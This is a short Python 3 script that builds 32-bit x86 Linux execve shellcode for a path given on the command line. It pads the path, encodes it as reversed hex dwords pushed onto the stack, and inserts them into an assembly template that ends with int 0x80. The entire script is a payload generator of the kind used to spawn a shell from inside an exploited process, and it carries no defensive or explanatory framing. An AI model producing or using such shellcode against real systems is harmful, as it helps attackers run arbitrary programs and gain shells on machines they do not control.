#!python3

import sys

if len(sys.argv) != 2:
   print("Usage: " + sys.argv[0] + " PATH")
   sys.exit(1)

path = sys.argv[1]

shellcode = "global _start \n \
\n \
section .text \n \
\n \
_start:  \n \
    xor eax, eax  \n \
\n \
    push eax  \n \
    *PATH*   \n \
    mov ebx, esp  \n \
\n \
    mov edx, eax  \n \
    mov ecx, eax  \n \
\n \
    mov al, 0xb  \n \
    int 0x80  \n \
"

pushed_value = ""
result = []
if (len(path) % 4) != 0:
   for i in range(0, 4 - len(path) % 4):
      path = "/" + path

for i in range(0, int(len(path) / 4)):
   tmp = ""
   for letter in path[i*4:(i+1)*4][4::-1]:
      tmp += str(hex(ord(letter))).replace('0x', '')
   result.append(tmp)

for doubleword in result[len(result)::-1]:
   pushed_value += ('	push 0x' + doubleword + "\n")

shellcode = shellcode.replace("*PATH*", pushed_value)

print(shellcode)
